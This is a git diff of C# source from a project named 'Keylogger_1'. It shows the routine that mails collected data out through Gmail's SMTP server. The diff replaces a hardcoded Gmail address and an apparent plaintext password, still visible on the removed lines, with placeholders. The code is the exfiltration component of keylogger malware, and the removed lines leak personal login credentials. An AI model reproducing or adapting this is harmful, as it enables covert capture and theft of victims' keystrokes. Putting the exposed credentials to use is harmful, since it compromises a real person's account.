@@ -100,16 +100,16 @@ namespace Keylogger_1
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587); // CHECK OUT THE DOCUMANTAION OF GMAIL--for the number 587
             MailMessage mailMessage = new MailMessage();
             //the source of the email .i.e the sender
-            mailMessage.From = new MailAddress("arnoldsprout@gmail.com");
+            mailMessage.From = new MailAddress("your@emial.com");
             //We send it back to our own email address, note this is for testing purposes
-            mailMessage.To.Add("arnoldsprout@gmail.com");
+            mailMessage.To.Add("tothesender@mail.com");
             mailMessage.Subject = subject;
             //this will require us to login, therefore we will set it to false
             client.UseDefaultCredentials = false;
             //this is because anything from google is encrypted
             client.EnableSsl = true;
             //Our creditentials so we can Login
-            client.Credentials = new System.Net.NetworkCredential("arnoldsprout@gmail.com", "gnabahTMohale");
+            client.Credentials = new System.Net.NetworkCredential("your@mail.com", "password");
             mailMessage.Body = emailBody;
 
             client.Send(mailMessage);
